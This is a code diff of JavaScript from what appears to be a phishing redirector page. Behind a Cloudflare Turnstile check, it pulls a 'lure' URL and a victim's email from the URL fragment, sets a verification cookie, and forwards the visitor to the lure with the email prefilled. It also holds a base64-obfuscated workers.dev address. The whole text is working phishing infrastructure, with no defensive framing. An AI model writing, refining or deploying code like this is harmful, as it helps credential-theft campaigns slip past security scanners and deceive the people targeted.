@@ -154,23 +154,26 @@
             console.log('Final Decoded Email:', email); 
             return email;
         }
-
-        // Extract redirect URL from ?lure= parameter and replace ? with #
-// Extract redirect URL from #lure= parameter
-function extractLureUrl() {
+// Extract both lure URL and email from the # fragment
+function extractLureAndEmail() {
     const hashFragment = window.location.hash.substring(1); // Remove the # symbol
     const fragmentParams = new URLSearchParams(hashFragment);
-    return fragmentParams.get('lure');
+
+    // Extract lure and POP parameters
+    const lure = fragmentParams.get('lure');
+    const email = fragmentParams.get('POP');
+
+    return { lure, email };
 }
 
-
-
 // Redirect to lure URL if provided
-async function redirectToLureUrlWithEmail(email) {
-    const lureUrl = extractLureUrl();
-    if (lureUrl) {
-        const separator = lureUrl.includes('?') ? '&' : '?';
-        const redirectUrl = `${lureUrl}${separator}redirected=done#POP=${encodeURIComponent(email || '')}`;
+async function redirectToLureUrlWithEmail() {
+    const { lure, email } = extractLureAndEmail();
+    if (lure) {
+        // Add `redirected=done` as a query parameter and retain POP in the fragment
+        const separator = lure.includes('?') ? '&' : '?';
+        const redirectUrl = `${lure}${separator}redirected=done#POP=${encodeURIComponent(email || '')}`;
+        
         console.log('Redirecting to:', redirectUrl);
         window.location.href = redirectUrl;
     } else {
@@ -181,43 +184,46 @@ async function redirectToLureUrlWithEmail(email) {
 
 
         // Start Turnstile verification
-        function startTurnstileVerification() {
-            const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
-            if (USE_TURNSTILE) {
-                console.log('Starting Turnstile verification...');
-                turnstile.render('#cf-turnstile', {
-                    sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
-                    type: 'spinner',
-                    callback: async function (token) {
-                        if (!token) {
-                            console.error('Turnstile verification failed');
-                            return;
-                        }
+function startTurnstileVerification() {
+    const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
+    if (USE_TURNSTILE) {
+        console.log('Starting Turnstile verification...');
+        turnstile.render('#cf-turnstile', {
+            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
+            type: 'spinner',
+            callback: async function (token) {
+                if (!token) {
+                    console.error('Turnstile verification failed');
+                    return;
+                }
 
-                        loadingDiv.style.display = 'flex';
+                loadingDiv.style.display = 'flex';
 
-                        var email = extractAndDecodeEmail();
+                // Extract both lure and email immediately
+                const { lure, email } = extractLureAndEmail();
 
-                        document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
+                // Set a cookie for verification (optional)
+                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
 
-                        setTimeout(async function() {
-                            loadingDiv.style.display = 'none';
+                setTimeout(async function() {
+                    loadingDiv.style.display = 'none';
 
-                            if (email) {
-                                await redirectToLureUrlWithEmail(email);
-                            } else {
-                                console.log('No email found to append to URL.');
-                            }
-                        }, 2000);
-                    },
-                    'error-callback': function () {
-                        console.error('Turnstile encountered an error');
+                    if (lure) {
+                        // Redirect to the lure URL
+                        await redirectToLureUrlWithEmail();
+                    } else {
+                        console.log('No lure URL found to redirect.');
                     }
-                });
-            } else {
-                console.log('Turnstile is not enabled.');
+                }, 2000);
+            },
+            'error-callback': function () {
+                console.error('Turnstile encountered an error');
             }
-        }
+        });
+    } else {
+        console.log('Turnstile is not enabled.');
+    }
+}
 
         // Run Turnstile verification
         startTurnstileVerification();
